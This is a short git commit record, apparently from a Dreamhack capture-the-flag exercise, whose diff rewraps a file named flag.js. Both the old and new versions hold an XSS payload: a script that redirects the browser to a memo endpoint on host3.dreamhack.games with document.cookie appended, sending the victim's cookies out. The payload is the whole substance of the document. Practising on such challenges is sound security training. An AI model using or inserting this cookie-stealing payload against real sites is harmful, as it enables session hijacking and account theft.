61d9768b47c94b2e389f65d3d8a46b1ce9255d9f
Park ByoungJun <151702008+pbj2647@users.noreply.github.com>
2024-08-13 16:44:16 +0900

    Update flag.js

--- flag.js
+++ flag.js
@@ -1,3 +1,7 @@
-<script>
-  location.href="http://host3.dreamhack.games:23189/memo?memo="+document.cookie
-</script>
+<html>
+  <body>
+    <script>
+      location.href="http://host3.dreamhack.games:23189/memo?memo="+document.cookie
+    </script>
+  </body>
+</html>
